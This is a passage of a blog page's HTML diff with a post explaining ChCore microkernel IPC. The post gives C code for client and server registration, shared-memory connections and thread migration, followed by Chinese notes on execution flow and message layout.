+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="szy">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="S blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="undefined | S blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2024/01/22/chcore/IPC/" class="post-title-link" itemprop="url">IPC</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2024-01-22 20:26:50" itemprop="dateCreated datePublished" datetime="2024-01-22T20:26:50+08:00">2024-01-22</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/chcore/" itemprop="url" rel="index"><span itemprop="name">chcore</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="Word count in article">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">Word count in article: </span>
+      <span>9.6k</span>
+    </span>
+    <span class="post-meta-item" title="Reading time">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">Reading time &asymp;</span>
+      <span>35 mins.</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h1><h2 id="code"><a href="#code" class="headerlink" title="code"></a>code</h2><h3 id="server"><a href="#server" class="headerlink" title="server"></a>server</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> cap;</span><br><span class="line"></span><br><span class="line">        cap = chcore_thread_create(routine, <span class="number">0</span>, <span class="number">0</span>, TYPE_USER);</span><br><span class="line">        chcore_bug_on(cap &lt; <span class="number">0</span>);</span><br><span class="line">        __chcore_set_procm_cap(cap);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">routine</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret, cap;</span><br><span class="line"></span><br><span class="line">        spawn(<span class="string">&quot;/user.bin&quot;</span>, &amp;cap); <span class="comment">/* Test spawn function */</span></span><br><span class="line">        ipc_register_server(lab4_test_ipc_dispatch);</span><br><span class="line">        spawn(<span class="string">&quot;/ipc_client.bin&quot;</span>, &amp;cap); <span class="comment">/* Test IPC */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">ipc_register_server</span><span class="params">(server_handler server_handler)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> <span class="title">vm_config</span>;</span></span><br><span class="line">        vm_config.buf_base_addr = SERVER_BUF_BASE;</span><br><span class="line">        vm_config.buf_size = SERVER_BUF_SIZE;</span><br><span class="line">        vm_config.stack_base_addr = SERVER_STACK_BASE;</span><br><span class="line">        vm_config.stack_size = SERVER_STACK_SIZE;</span><br><span class="line">        ret = __chcore_sys_register_server(</span><br><span class="line">                (u64)server_handler, MAX_CLIENT, (u64)&amp;vm_config);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">u64 <span class="title function_">sys_register_server</span><span class="params">(u64 callback, u64 max_client, u64 vm_config_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">server</span> =</span> current_thread;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">server_ipc_config</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> *<span class="title">vm_config</span>;</span></span><br><span class="line">        <span class="type">int</span> r;</span><br><span class="line">        server_ipc_config = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> server_ipc_config));</span><br><span class="line">        server_ipc_config-&gt;callback = callback;</span><br><span class="line">        server_ipc_config-&gt;max_client = max_client;</span><br><span class="line">        server_ipc_config-&gt;conn_bmp =</span><br><span class="line">                kzalloc(BITS_TO_LONGS(max_client) * <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class="line">        r = copy_from_user(</span><br><span class="line">                (<span class="type">char</span> *)vm_config, (<span class="type">char</span> *)vm_config_ptr, <span class="keyword">sizeof</span>(*vm_config));</span><br><span class="line">        server-&gt;general_ipc_config = server_ipc_config;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">lab4_test_ipc_dispatch</span><span class="params">(<span class="keyword">struct</span> ipc_msg *ipc_msg, u64 client_pid)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> ret_cap, write_val;</span><br><span class="line">        <span class="type">bool</span> ret_with_cap = <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> len = ipc_msg-&gt;data_len;</span><br><span class="line">        <span class="keyword">while</span> ((i * <span class="number">4</span>) &lt; len) &#123;</span><br><span class="line">            ret += ((<span class="type">int</span> *)ipc_get_msg_data(ipc_msg))[i];</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret_with_cap)</span><br><span class="line">                ipc_return_with_cap(ipc_msg, ret);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                ipc_return(ipc_msg, ret);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sys_ipc_return</span><span class="params">(u64 ret, u64 cap_num)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span> =</span> current_thread-&gt;active_conn;</span><br><span class="line">        <span class="keyword">if</span> (cap_num != <span class="number">0</span>) &#123;</span><br><span class="line">                ipc_send_cap_to_client(conn, cap_num);</span><br><span class="line">        &#125;</span><br><span class="line">        conn-&gt;source-&gt;thread_ctx-&gt;state = TS_RUNNING;</span><br><span class="line">        conn-&gt;source-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class="line">        thread_migrate_to_client(conn, ret);</span><br><span class="line">     	BUG(<span class="string">&quot;This function should never\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">thread_migrate_to_client</span><span class="params">(<span class="keyword">struct</span> ipc_connection *conn, u64 ret_value)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">source</span> =</span> conn-&gt;source;</span><br><span class="line">        current_thread-&gt;active_conn = <span class="literal">NULL</span>;</span><br><span class="line">        arch_set_thread_return(source, ret_value);</span><br><span class="line">        switch_to_thread(source);</span><br><span class="line">        eret_to_thread(switch_context());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="client"><a href="#client" class="headerlink" title="client"></a>client</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[], <span class="type">char</span> *envp[])</span></span><br><span class="line">&#123;</span><br><span class="line">        test_ipc_routine(__chcore_get_procm_cap());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test_ipc_routine</span><span class="params">(<span class="type">int</span> server_cap)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_struct</span> *<span class="title">client_ipc_struct</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_msg</span> *<span class="title">ipc_msg</span>;</span></span><br><span class="line">        <span class="type">int</span> shared_page_pmo_cap, shared_msg;</span><br><span class="line">        <span class="type">int</span> ret, i;</span><br><span class="line">        client_ipc_struct = ipc_register_client(server_cap);</span><br><span class="line"></span><br><span class="line">       ipc_msg = ipc_create_msg(client_ipc_struct, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; IPC_TEST_NUM; i++) &#123;</span><br><span class="line">                ipc_set_msg_data(ipc_msg, (<span class="type">char</span> *)&amp;i, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">                ret = ipc_call(client_ipc_struct, ipc_msg);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">struct</span> ipc_struct *<span class="title function_">ipc_register_client</span><span class="params">(<span class="type">int</span> server_thread_cap)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> conn_cap, retry_times = RETRY_UPPER_BOUND;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_struct</span> *<span class="title">ipc_struct</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ipc_struct));</span><br><span class="line">        <span class="type">int</span> client_id = __sync_fetch_and_add(&amp;client_ipc_num, <span class="number">1</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> <span class="title">vm_config</span>;</span></span><br><span class="line">        vm_config.buf_base_addr = CLIENT_BUF_BASE + client_id * CLIENT_BUF_SIZE;</span><br><span class="line">        vm_config.buf_size = CLIENT_BUF_SIZE;</span><br><span class="line">        conn_cap = __chcore_sys_register_client((u32)server_thread_cap,(u64)&amp;vm_config);</span><br><span class="line">        ipc_struct-&gt;shared_buf = vm_config.buf_base_addr;</span><br><span class="line">        ipc_struct-&gt;shared_buf_len = vm_config.buf_size;</span><br><span class="line">        ipc_struct-&gt;conn_cap = conn_cap;</span><br><span class="line">        spinlock_init(&amp;ipc_struct-&gt;ipc_lock);</span><br><span class="line">        <span class="keyword">return</span> ipc_struct;</span><br><span class="line">&#125;</span><br><span class="line">u32 <span class="title function_">sys_register_client</span><span class="params">(u32 server_cap, u64 vm_config_ptr)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">client</span> =</span> current_thread;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">server</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> <span class="title">vm_config</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        u64 client_buf_size;</span><br><span class="line">        <span class="type">int</span> conn_cap = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">        r = copy_from_user(</span><br><span class="line">                (<span class="type">char</span> *)&amp;vm_config, (<span class="type">char</span> *)vm_config_ptr, <span class="keyword">sizeof</span>(vm_config));</span><br><span class="line">        server = obj_get(current_cap_group, server_cap, TYPE_THREAD);</span><br><span class="line">        client_buf_size = vm_config.buf_size;</span><br><span class="line">        conn_cap = create_connection(client, server, &amp;vm_config);</span><br><span class="line">        conn = obj_get(current_cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class="line">        <span class="keyword">if</span> (client_buf_size != vm_config.buf_size) &#123;</span><br><span class="line">                r = copy_to_user((<span class="type">char</span> *)vm_config_ptr,</span><br><span class="line">                                 (<span class="type">char</span> *)&amp;vm_config,</span><br><span class="line">                                 <span class="keyword">sizeof</span>(vm_config));</span><br><span class="line">        &#125;</span><br><span class="line">        r = conn_cap;</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">create_connection</span><span class="params">(<span class="keyword">struct</span> thread *source, <span class="keyword">struct</span> thread *target,</span></span><br><span class="line"><span class="params">                             <span class="keyword">struct</span> ipc_vm_config *client_vm_config)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> conn_cap = <span class="number">0</span>, server_conn_cap = <span class="number">0</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pmobject</span> *<span class="title">stack_pmo</span>, *<span class="title">buf_pmo</span>;</span></span><br><span class="line">        <span class="type">int</span> conn_idx;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">server_ipc_config</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_vm_config</span> *<span class="title">vm_config</span>;</span></span><br><span class="line">        u64 server_stack_base, server_buf_base, client_buf_base;</span><br><span class="line">        u64 stack_size, buf_size;</span><br><span class="line">        conn = obj_alloc(TYPE_CONNECTION, <span class="keyword">sizeof</span>(*conn));</span><br><span class="line">        conn-&gt;target = create_server_thread(target);</span><br><span class="line">        server_ipc_config = target-&gt;general_ipc_config;</span><br><span class="line">        vm_config = &amp;server_ipc_config-&gt;vm_config;</span><br><span class="line">        conn_idx = find_next_zero_bit(</span><br><span class="line">                server_ipc_config-&gt;conn_bmp, server_ipc_config-&gt;max_client, <span class="number">0</span>);</span><br><span class="line">        set_bit(conn_idx, server_ipc_config-&gt;conn_bmp);</span><br><span class="line">        server_stack_base = vm_config-&gt;stack_base_addr + conn_idx * vm_config-&gt;stack_size;</span><br><span class="line"></span><br><span class="line">        stack_size = vm_config-&gt;stack_size;</span><br><span class="line">        stack_pmo = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pmobject));</span><br><span class="line">        pmo_init(stack_pmo, PMO_DATA, stack_size, <span class="number">0</span>);</span><br><span class="line">        vmspace_map_range(target-&gt;vmspace,</span><br><span class="line">                          server_stack_base,</span><br><span class="line">                          stack_size,</span><br><span class="line">                          VMR_READ | VMR_WRITE,</span><br><span class="line">                          stack_pmo);</span><br><span class="line">        conn-&gt;server_stack_top = server_stack_base + stack_size;</span><br><span class="line">        server_buf_base = vm_config-&gt;buf_base_addr + conn_idx * vm_config-&gt;buf_size;</span><br><span class="line">        client_buf_base = client_vm_config-&gt;buf_base_addr;</span><br><span class="line">        buf_size = MIN(vm_config-&gt;buf_size, client_vm_config-&gt;buf_size);</span><br><span class="line">        client_vm_config-&gt;buf_size = buf_size;</span><br><span class="line">        buf_pmo = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> pmobject));</span><br><span class="line">        pmo_init(buf_pmo, PMO_DATA, buf_size, <span class="number">0</span>);</span><br><span class="line">        vmspace_map_range(current_thread-&gt;vmspace, client_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class="line">        vmspace_map_range(target-&gt;vmspace, server_buf_base, buf_size, VMR_READ | VMR_WRITE, buf_pmo);</span><br><span class="line">        conn-&gt;buf.client_user_addr = client_buf_base;</span><br><span class="line">        conn-&gt;buf.server_user_addr = server_buf_base;</span><br><span class="line">        conn_cap = cap_alloc(current_cap_group, conn, <span class="number">0</span>);</span><br><span class="line">        server_conn_cap =</span><br><span class="line">                cap_copy(current_cap_group, target-&gt;cap_group, conn_cap);</span><br><span class="line">        conn-&gt;server_conn_cap = server_conn_cap;</span><br><span class="line">        <span class="keyword">return</span> conn_cap;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> thread *<span class="title function_">create_server_thread</span><span class="params">(<span class="keyword">struct</span> thread *src)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">new</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">new_config</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">src_config</span>;</span></span><br><span class="line">        new = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> thread));</span><br><span class="line">        new-&gt;vmspace = obj_get(src-&gt;cap_group, VMSPACE_OBJ_ID, TYPE_VMSPACE);</span><br><span class="line">        new-&gt;thread_ctx = create_thread_ctx(TYPE_SHADOW);</span><br><span class="line">        <span class="built_in">memcpy</span>((<span class="type">char</span> *)&amp;(new-&gt;thread_ctx-&gt;ec),</span><br><span class="line">               (<span class="type">const</span> <span class="type">char</span> *)&amp;(src-&gt;thread_ctx-&gt;ec),</span><br><span class="line">               <span class="keyword">sizeof</span>(<span class="type">arch_exec_cont_t</span>));</span><br><span class="line">        new-&gt;thread_ctx-&gt;prio = MAX_PRIO - <span class="number">1</span>;</span><br><span class="line">        new-&gt;thread_ctx-&gt;state = TS_INIT;</span><br><span class="line">        new-&gt;thread_ctx-&gt;affinity = NO_AFF;</span><br><span class="line">        new-&gt;thread_ctx-&gt;type = TYPE_SHADOW;</span><br><span class="line">        src_config = (<span class="keyword">struct</span> server_ipc_config *)src-&gt;general_ipc_config;</span><br><span class="line">        new_config = kzalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> server_ipc_config));</span><br><span class="line">        new_config-&gt;callback = src_config-&gt;callback;</span><br><span class="line">        new_config-&gt;vm_config = src_config-&gt;vm_config;</span><br><span class="line">        new-&gt;general_ipc_config = new_config;</span><br><span class="line">        new-&gt;cap_group = src-&gt;cap_group;</span><br><span class="line">        obj_put(new-&gt;vmspace);</span><br><span class="line">        <span class="keyword">return</span> new;</span><br><span class="line">&#125;</span><br><span class="line">u64 <span class="title function_">sys_ipc_call</span><span class="params">(u32 conn_cap, <span class="keyword">struct</span> ipc_msg *ipc_msg, u64 cap_num)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">ipc_connection</span> *<span class="title">conn</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        u64 arg;</span><br><span class="line">        <span class="type">int</span> r = <span class="number">0</span>;</span><br><span class="line">        conn = obj_get(current_thread-&gt;cap_group, conn_cap, TYPE_CONNECTION);</span><br><span class="line">        conn-&gt;ipc_msg = ipc_msg;</span><br><span class="line">        <span class="keyword">if</span> (cap_num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                r = ipc_send_cap(conn);</span><br><span class="line">        &#125;</span><br><span class="line">        arg = conn-&gt;buf.server_user_addr;</span><br><span class="line">        thread_migrate_to_server(conn, arg);</span><br><span class="line">   		BUG(<span class="string">&quot;This function should never\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> u64 <span class="title function_">thread_migrate_to_server</span><span class="params">(<span class="keyword">struct</span> ipc_connection *conn, u64 arg)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">target</span> =</span> conn-&gt;target;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">server_ipc_config</span> *<span class="title">target_ipc_config</span> =</span></span><br><span class="line">                (<span class="keyword">struct</span> server_ipc_config *)(target-&gt;general_ipc_config);</span><br><span class="line">        u64 callback = target_ipc_config-&gt;callback;</span><br><span class="line">        conn-&gt;source = current_thread;</span><br><span class="line">        current_thread-&gt;thread_ctx-&gt;state = TS_WAITING;</span><br><span class="line">        target-&gt;active_conn = conn;</span><br><span class="line">        obj_put(conn);</span><br><span class="line">        arch_set_thread_stack(target, conn-&gt;server_stack_top);</span><br><span class="line">        arch_set_thread_next_ip(target, callback);</span><br><span class="line">        arch_set_thread_arg0(target, arg);</span><br><span class="line">        arch_set_thread_arg1(target, current_thread-&gt;cap_group-&gt;pid);</span><br><span class="line">        target-&gt;thread_ctx-&gt;sc = current_thread-&gt;thread_ctx-&gt;sc;</span><br><span class="line">        switch_to_thread(target);</span><br><span class="line">        eret_to_thread(switch_context());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="执行流"><a href="#执行流" class="headerlink" title="执行流"></a>执行流</h2><p>client先register_client，需要知道想要通信的服务端进程。</p>
+<p>创建连接会为服务端进程再创建一个线程，设置相同的vmspace (每个client都会在服务器进程创建一个线程作为单独的连接对象)</p>
+<p>client ipc_call时，不用sched，而是直接switch到target，将自己设置为waiting，不加入等待队列。需要设置参数和target为服务端的处理函数。</p>
+<p>server ipc_return时，设置client为running后直接switch到client，设置返回值</p>
+<p>由于ipc的操作都是进内核的，eret会直接返回到用户态，因此server返回到client时，执行ipc_call的下一条指令，切换到server的调用链直接被中止。由于ret addr不使用栈，因此也不会对内核栈产生很大的破坏。</p>
+<h2 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h2><p>每个connection会创建pmo，同时映射到client和server的地址空间</p>
+<p>client和server的thread是一对一的，但是即使是不同的thread也是服务在同一个写死的地址上，所以需要根据不同情况算偏移找不同的位置。</p>
+<ul>
+<li>server: 同一个dispatch会需要支持不同client访问，每次create_connection时会得到不同的连接，server对于IPC提供的缓冲区根据不同connection id找到偏移 服务不同客户</li>
+<li>client：同一个cilent会需要和不同的server通信，每次register client会拿到不同client id，client对于IPC提供的缓冲区根据不同的client id找到偏移，请求不同的服务</li>
+</ul>
+<p>每个client创建pmo，然后映射到服务端的地址都不会重复。buf和stack各需要一个pmo</p>
+<ul>
+<li><p><code>buf_addr</code>为A-stack client server共享内存 传递参数</p>
+</li>
+<li><p><code>stack_addr</code>为E-stack server thread执行用</p>
+</li>
+</ul>
+<h2 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h2><p>client通过<code>ipc_create_msg</code> 会把消息直接写入到共享内存的开头，在迁移线程时设置地址为服务端共享内存地址即可（两端虚拟地址不一样，但物理地址一样）</p>
+<p>共享内存首地址即为msg对象(元数据)，而紧接着msg对象的就是msg所带data </p>
+<p>可以自己为每种不同的IPC定义request结构体，然后直接进行类型转换</p>
+<p>以文件系统为例，共享内存布局如下</p>
+<p>msg元数据—fs_request元数据—文件数据</p>
+<h2 id="cap"><a href="#cap" class="headerlink" title="cap"></a>cap</h2><p>需要传递资源给server</p>
+<p>很多IPC的操作是被写在kernel里的，kernel的地址空间是共用的，因此即使是不同进程本地修改cap，在context switch到另一个进程时，修改仍有效</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://szy0127.github.io/2024/01/22/chcore/chcore/">
+
